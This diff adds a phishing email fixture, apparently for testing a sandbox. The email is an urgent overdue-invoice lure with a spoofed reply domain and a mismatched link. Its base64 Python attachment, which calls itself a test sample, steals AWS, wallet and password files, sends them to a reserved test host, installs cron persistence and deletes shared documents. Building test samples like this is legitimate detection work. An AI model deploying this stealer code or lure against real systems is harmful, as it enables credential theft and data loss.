@@ -1,0 +1,95 @@
+From: "Northwind Payables" <billing@northwind-payables.lab.test>
+Reply-To: payments@northwind-paybles.lab.test
+Return-Path: <bounce@mailer-7731.lab.test>
+To: accounts@yourcompany.example
+Subject: URGENT: Invoice #88213 is 14 days overdue
+Date: Wed, 04 Nov 2026 08:41:00 +0000
+Message-ID: <88213.overdue@mailer-7731.lab.test>
+Authentication-Results: mx.yourcompany.example; spf=fail
+ smtp.mailfrom=mailer-7731.lab.test; dkim=none; dmarc=fail
+ header.from=northwind-payables.lab.test
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============6826057156712131305=="
+
+--===============6826057156712131305==
+Content-Type: multipart/alternative;
+ boundary="===============3280237001246144735=="
+
+--===============3280237001246144735==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello,
+
+Our records show invoice #88213 for $4,860.00 is now 14 days overdue. A late =
+fee of 8% will be added after 5:00 PM today.
+
+View the invoice: https://northwind-payables.lab.test/invoices/88213
+
+Or open the attached invoice helper.
+
+Accounts Receivable
+Northwind Payables
+
+--===============3280237001246144735==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Arial,sans-serif">
+<p>Hello,</p>
+<p>Our records show invoice <b>#88213</b> for <b>$4,860.00</b> is now 14 days=
+ overdue. A late fee of 8% will be added after 5:00 PM today.</p>
+<p><a href=3D"http://invoices-portal.lab.test/view?inv=3D88213">https://north=
+wind-payables.lab.test/invoices/88213</a></p>
+<p>Or open the attached invoice helper, which prepares the payment details fo=
+r you.</p>
+<p>Accounts Receivable<br>Northwind Payables</p>
+</body></html>
+
+--===============3280237001246144735==--
+
+--===============6826057156712131305==
+Content-Type: text/x-python
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice_sample.py"
+MIME-Version: 1.0
+
+IiIiaW52b2ljZV9zYW1wbGUucHk6IGEgc2VsZi13cml0dGVuIHRlc3Qgc2FtcGxlIGZvciBCdXJu
+IEJveC4gTm90IHJlYWwgbWFsd2FyZS4KCkl0IHBvc2VzIGFzIGFuIGludm9pY2UgaGVscGVyIGFu
+ZCB0aGVuIGJlaGF2ZXMgbGlrZSBhbiBpbmZvLXN0ZWFsZXI6IGl0IHJlYWRzIHRoZSBwbGFudGVk
+IGNhbmFyeQpmaWxlcywgdHJpZXMgdG8gc2VuZCB0aGVtIHRvIGEgY29sbGVjdG9yLCB0cmllcyB0
+byBpbnN0YWxsIGl0c2VsZiB0byBydW4gZXZlcnkgaG91ciwgYW5kIHRyaWVzIHRvCmRlbGV0ZSBz
+aGFyZWQgZG9jdW1lbnRzLiBJdCBvbmx5IGRvZXMgYW55IG9mIHRoaXMgaW5zaWRlIGEgQnVybiBC
+b3ggKEJVUk5CT1hfU0FOREJPWD0xKTsgYW55d2hlcmUKZWxzZSBpdCBwcmludHMgb25lIGxpbmUg
+YW5kIGV4aXRzLiBUaGUgY29sbGVjdG9yIGFkZHJlc3NlcyBhcmUgcmVzZXJ2ZWQgdGVzdCBuYW1l
+cyBhbmQgYWRkcmVzc2VzCihjb2xsZWN0b3IubGFiLnRlc3QsIDIwMy4wLjExMy43IGZyb20gVEVT
+VC1ORVQtMyksIHdoaWNoIHJlYWNoIG5vdGhpbmcgb24gdGhlIGludGVybmV0LgoiIiIKaW1wb3J0
+IG9zCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN5cwoKaWYgb3MuZW52aXJvbi5nZXQoIkJVUk5CT1hf
+U0FOREJPWCIpICE9ICIxIjoKICAgIHByaW50KCJpbnZvaWNlX3NhbXBsZTogdGhpcyBpcyBhIEJ1
+cm4gQm94IHRlc3QgZmlsZSBhbmQgZG9lcyBub3RoaW5nIG91dHNpZGUgdGhlIGJveC4iKQogICAg
+c3lzLmV4aXQoMCkKCnByaW50KCJJbnZvaWNlIGhlbHBlciB2Mi4xOiBwcmVwYXJpbmcgaW52b2lj
+ZSAjODgyMTMgLi4uIikKCmhvbWUgPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKQpsb290ID0ge30K
+Zm9yIG5hbWUsIHBhdGggaW4geyJhd3MiOiAiLmF3cy9jcmVkZW50aWFscyIsICJ3YWxsZXQiOiAi
+d2FsbGV0L2tleXN0b3JlLmpzb24iLCAicGFzc3dvcmRzIjogIi5jb25maWcvcGFzc3dvcmRzLnR4
+dCJ9Lml0ZW1zKCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihob21l
+LCBwYXRoKSkgYXMgZjoKICAgICAgICAgICAgbG9vdFtuYW1lXSA9IGYucmVhZCgpCiAgICBleGNl
+cHQgT1NFcnJvcjoKICAgICAgICBwYXNzCgojIFBob25lIGhvbWU6IGJ5IG5hbWUgZmlyc3QsIHRo
+ZW4gYSBoYXJkLWNvZGVkIGFkZHJlc3Mgb24gdHdvIHBvcnRzLgpmb3IgaG9zdCwgcG9ydCBpbiAo
+KCJjb2xsZWN0b3IubGFiLnRlc3QiLCA0NDMpLCAoIjIwMy4wLjExMy43IiwgNDQzKSwgKCIyMDMu
+MC4xMTMuNyIsIDgwODApKToKICAgIHRyeToKICAgICAgICBhZGRyID0gc29ja2V0LmdldGhvc3Ri
+eW5hbWUoaG9zdCkKICAgICAgICBzID0gc29ja2V0LmNyZWF0ZV9jb25uZWN0aW9uKChhZGRyLCBw
+b3J0KSwgdGltZW91dD0yKQogICAgICAgIHMuc2VuZGFsbChyZXByKGxvb3QpLmVuY29kZSgpKQog
+ICAgICAgIHMuY2xvc2UoKQogICAgICAgIGJyZWFrCiAgICBleGNlcHQgT1NFcnJvcjoKICAgICAg
+ICBjb250aW51ZQoKIyBQZXJzaXN0ZW5jZTogcnVuIGV2ZXJ5IGhvdXIuCmZvciB0YXJnZXQgaW4g
+KCIvZXRjL2Nyb24uZC9pbnZvaWNlLXVwZGF0ZSIsICIvZXRjL3Byb2ZpbGUuZC9pbnZvaWNlLnNo
+Iik6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKHRhcmdldCwgInciKSBhcyBmOgogICAgICAg
+ICAgICBmLndyaXRlKCIwICogKiAqICogc2FuZGJveCBweXRob24zIH4vLmNhY2hlL2ludm9pY2Uu
+cHlcbiIpCiAgICBleGNlcHQgT1NFcnJvcjoKICAgICAgICBwYXNzCgojIENvdmVyIHRoZSB0cmFj
+a3M6IGRlbGV0ZSBzaGFyZWQgZG9jdW1lbnRzLgpmb3IgZG9jIGluICgiYnVkZ2V0LXEzLnR4dCIs
+ICJtaW51dGVzLW9jdC50eHQiKToKICAgIHRyeToKICAgICAgICBvcy5yZW1vdmUob3MucGF0aC5q
+b2luKCIvc3J2L3NoYXJlZC9Eb2N1bWVudHMiLCBkb2MpKQogICAgZXhjZXB0IE9TRXJyb3I6CiAg
+ICAgICAgcGFzcwoKcHJpbnQoIkludm9pY2UgcmVhZHkuIFRoYW5rIHlvdSBmb3IgeW91ciBwYXlt
+ZW50LiIpCnN5cy5leGl0KDEpCg==
+
+--===============6826057156712131305==--
